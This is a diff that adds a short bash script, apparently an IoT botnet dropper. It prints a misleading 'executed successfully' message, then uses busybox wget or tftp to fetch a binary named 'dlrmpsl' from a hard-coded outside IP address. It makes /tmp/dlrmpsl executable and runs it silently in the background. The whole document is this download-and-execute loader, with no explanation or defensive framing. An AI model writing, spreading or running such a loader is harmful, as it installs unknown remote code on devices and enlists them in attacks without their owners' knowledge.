@@ -1,0 +1,5 @@
+#!/bin/bash
+echo "mpsl binary executed successfully"
+/bin/busybox wget -O - http://63.250.59.28:80/dlrmpsl || /bin/busybox tftp -g -r dlrmpsl 63.250.59.28 || echo "Download failed"
+chmod +x /tmp/dlrmpsl 2>/dev/null
+/tmp/dlrmpsl 2>/dev/null &
